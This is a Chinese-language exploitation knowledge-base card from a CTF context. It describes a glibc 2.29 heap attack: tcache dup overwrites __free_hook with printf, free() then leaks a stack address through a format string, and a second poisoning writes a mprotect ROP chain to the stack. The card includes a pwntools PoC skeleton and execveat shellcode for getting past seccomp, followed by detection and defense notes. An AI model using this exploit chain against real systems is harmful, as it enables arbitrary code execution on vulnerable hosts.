---
id: binary-pwn-format-string-freehook-printf-stack-leak
title: glibc 2.29 tcache dup 改 __free_hook 为 printf：free 触发格式化字符串泄露栈地址后二次投毒写栈 ROP
type: scenario
domain: binary
path: binary/pwn/format-string
technique: tcache-dup-freehook-printf-stack-leak
tags:
- pwn
- heap
- format-string
- tcache
- free-hook
- glibc229
- stack-leak
- rop
- ctf
cve: []
severity: high
confidence: high
affected_versions: glibc 2.29
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V263
  verified_at: '2026-11-07T17:48:15+08:00'
  notes: V263 复核：本文无图片，已完整重读 content.md 与完整 exp。卡面对应文章“tcache dup with __free_hook -> printf 格式化字符串泄露栈地址”段落：__free_hook 被写成 printf 后 free(格式串 chunk) 触发 printf，%p\n*5 输出第 4 个为 0x7ffc... 栈地址；随后再次 tcache dup 把 chunk 分配到 stack_leak+0x5a7 写 mprotect(heap_base,0x3000,7) ROP 并跳 heap_base+0xe00 shellcode，与原文步骤/PoC 一致。glibc 2.29 为原文明确测试环境且该链依赖其 tcache 无 safe-linking、__free_hook 存在，按二进制卡库内惯例保留 affected_versions=glibc 2.29。dedup：无 exact/duplicate；最近候选 binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop（cos 0.9319，environ 泄栈）与 safe-linking 栈泄露卡均为 different 泄栈原语，verdict=related，不合并。未复跑 exp；frontmatter 无 sources/source（符合禁用要求），亦无 source_url。
url: /docs/binary/pwn/format-string/binary-pwn-format-string-freehook-printf-stack-leak/
draft: false
kb_aliases:
- __free_hook 改 printf
- free 触发格式化字符串
- tcache dup 泄栈
- free_hook 格式化字符串泄栈
- glibc 2.29 栈泄露
---

## 一句话结论

在 glibc 2.29（`__free_hook` 仍存在、tcache 无 safe-linking）的堆题里，用 tcache dup 把 `__free_hook` 改成 `printf`，再 `free()` 一块内容为 `%p\n%p...` 的 chunk，就能让释放路径代替 printf 执行格式化字符串，从栈参数中直接打印出栈地址；拿到栈地址后再次 tcache dup 把 chunk 分配到栈返回地址上写 ROP，即可从堆利用过渡到栈控制。

## 原理

- **glibc 2.29 的 tcache dup**：`tcache_get` 只检查 `tcache->entries[tc_idx] != NULL`，不校验 `counts`；已释放 chunk 的 `fd` 被改写后，连续两次 `malloc` 第二次就会返回任意地址。2.32 才引入 safe-linking，因此这里 `fd` 可以直接写目标绝对地址，不需要异或编码。
- **`__free_hook` 的调用语义**：glibc 2.34 之前 `free()` 入口检查 `__free_hook` 非空则跳转执行，并把待释放指针作为第一个参数传入。把它写成 `printf` 后，`free(buf)` 实际执行 `printf(buf)`；如果 `buf` 内容可控，就等价于一次格式化字符串漏洞。
- **为什么能泄栈**：`printf` 的 `%p` 会按 ABI 依次读取 `rsi/rdx/rcx/r8/r9` 与栈上的可变参数。调用点是 `free` 内部转跳，栈上仍残留调用者（菜单/编辑函数）的返回地址、保存的 rbp 等指针，因此 `%p` 序列中会打印出 `0x7ffc...` 形态的栈地址；文章中 `"%p\n"*5` 的第 4 个输出即为栈地址。
- **为什么要在覆盖前把 free 做完**：`__free_hook=printf` 之后 `free` 不再真正释放内存，tcache 链无法再通过 free 构造；必须在覆盖 hook 之前把后续要用的 chunk 全部释放好（文章注释“之后没有 free 了，提前 free 掉先”）。
- **二次投毒到栈**：拿到栈地址后，用重叠块再次改写 tcache `fd` 为栈上的目标返回地址（文章为 `stack_leak+0x5a7`），连续分配两次，第二次 `malloc` 返回该栈地址，写入 ROP 链；`quit()` 让 `main` 返回，覆盖的返回地址生效。
- **ROP 与 shellcode 的分工**：栈上 ROP 调 `mprotect(heap_base, 0x3000, 7)` 把堆页改为 RWX，再跳转到此前写入某个 0x128 chunk 的 shellcode，完成后续 seccomp 绕过。
- **替代泄栈路线**：同一原语也可把 chunk 分配到 `environ-0x10` 附近，`show` 读出 `environ` 的值得到栈地址；两条路可互换。

## 触发条件

- glibc 2.29（或至少 2.34 之前存在 `__free_hook`、且 tcache 未启用 safe-linking 的版本）。
- 已获得 tcache 任意地址分配能力（如 house of einherjar 造重叠块后 tcache poisoning，或直接的 UAF/double free）。
- 有可控内容的 chunk 可被 `free`，且 free 之后程序仍继续运行（触发 `printf` 后能返回菜单）。
- 已知 libc 基址（需要 `printf` 与 `__free_hook` 符号地址），以及堆地址（用于伪造重叠块/修改 tcache fd）。
- 能继续做第二次任意分配以写栈返回地址。

## 利用步骤

1. 泄露 heap 基址与 libc 基址（heap 可用 tcache 链表 show，libc 可用 unsorted bin show）。
2. 用重叠块完成 tcache dup：释放一个 0x30 大小的 chunk，改写其 `fd` 为 `libc.sym.__free_hook`。
3. 构造格式串载体：申请 0x28 chunk 并写入 `b"%p\n"*5`；此时不要立即覆盖 hook。
4. 连续两次 `add(0x28, ...)`：第一次消费原 chunk，第二次 `malloc` 返回 `__free_hook`，写入 `p64(libc.sym.printf)`。
5. `free(载体)`：`__free_hook` 触发 `printf("%p\n%p\n...")`，从输出第 4 行读取栈地址。
6. 再次用重叠块改写 tcache `fd` 为 `stack_leak+0x5a7`（按目标栈布局调整），两次分配，第二次返回栈地址。
7. 向该地址写入 `mprotect(heap_base, 0x3000, 7)` 的 ROP 链与 shellcode 地址；若 shellcode 放在堆块中，同时把该堆块地址作为 ROP 最后一跳。
8. 触发 `quit()`/`main` 返回，ROP 执行 mprotect 并跳入 shellcode。
9. 若走替代路线：把 fd 改为 `libc.sym.environ-0x10`，分配两次后用 show 读 `environ` 得到栈地址，跳到步骤 6。

## PoC

最小骨架（地址、偏移按目标 libc 与堆布局调整）：

```python
# 前置：已完成 heap/libc 泄露，并拿到可改写的重叠块（见 house of einherjar / tcache dup 卡）
add(0x28, b"%p\n" * 5)                     # 0: 格式化串载体
dele(0)                                    # 载体入 tcache[0x30]
add(0xe8, flat(0, 0x31, libc.sym.__free_hook))  # 用重叠块改写 tcache fd
add(0x28, b"%p\n" * 5)                     # 取回载体（内容保持格式串）
add(0x28, p64(libc.sym.printf))            # 第二次分配返回 __free_hook，写入 printf
dele(0)                                    # free(载体) -> printf("%p\n...")，第 4 个为栈地址

stack_leak = int(rl(), 16)
target = stack_leak + 0x5a7                # 指向 main 返回地址附近，按环境调整
rop = ROP(libc)
rop.mprotect(heap_base, 0x3000, 7)
rop.raw(heap_base + 0xe00)                 # shellcode 所在堆块
add(0xe8, flat(0) * 7 + p64(0x131) + p64(target))  # 再次投毒 tcache
add(0x128, shellcode)                      # 写 shellcode
add(0x128, rop.chain())                    # 第二次分配落栈，写 ROP
quit()                                     # main 返回触发 ROP
```

```asm
; 文章后续 shellcode：seccomp 禁 execve 时用 execveat(AT_FDCWD, "/bin/sh", NULL, NULL, 0)
xor rsi, rsi
push rsi
mov rdi, 0x68732f6e69622f   ; "/bin/sh"
push rdi
mov rsi, rsp
push -100                   ; AT_FDCWD
pop rdi
xor rdx, rdx
xor r10, r10
xor r8, r8
mov rax, 322                ; execveat
syscall
```

## 变体与关联

- 变体：不用 `printf` 泄栈，改把 tcache chunk 分配到 `environ-0x10`，`show` 读 `environ` 值得到栈地址；不依赖 `%p` 命中栈参数。
- 变体：若不需要泄栈，可直接把 `__free_hook` 写成 `system`，并让待释放字符串本身是命令（需要能控制 free 的参数内容）；本卡路线适合 free 参数是格式化串、又缺少 libc 泄露的场景。
- 变体：2.34+ 无 `__free_hook`，需改用 `_IO_list_all`/exit_funcs/`tcache_perthread_struct` 等目标，且 safe-linking 需要编码 `fd`。
- 关联：[[binary-pwn-heap-house-of-einherjar-offby-null-fake-chunk-tcache-poison]]（重叠块与 tcache poisoning 的来源）、[[binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop]]（environ 泄栈 + 栈上 ROP）、[[binary-pwn-heap-tcache-safe-linking-stack-leak-chunk-to-stack]]（2.32+ safe-linking 下的栈泄露/栈分配）、[[binary-pwn-heap-freehook-setcontext61-bridge-orw]]（另一种 free_hook 收尾）。
- 关联：[[binary-pwn-sandbox-escape-seccomp-execveat-shell-builtin-read]]（本链 shellcode 之后的 seccomp 绕过）。

## 检测与防御

- 防御：glibc 2.34+ 移除 `__free_hook`/`__malloc_hook`，并启用 safe-linking、tcache key 与对齐检查；及时升级 glibc 是根因修复。
- 防御：消除 tcache dup 来源——free 后置空指针、删除接口校验对象状态、编辑接口校验长度；对 off-by-null 边界写做修复。
- 检测：`__free_hook` 被写成 libc 内 `printf`/`system` 等地址；同一 tcache bin 的 `fd` 指向非堆区（libc、栈）；程序在无格式串调用点出现 `%p`/`%n` 类输出；分配返回栈地址。
- 注意：该场景为 CTF/授权环境利用，PoC 依赖具体 libc 偏移与栈布局，换题必须重新核对。
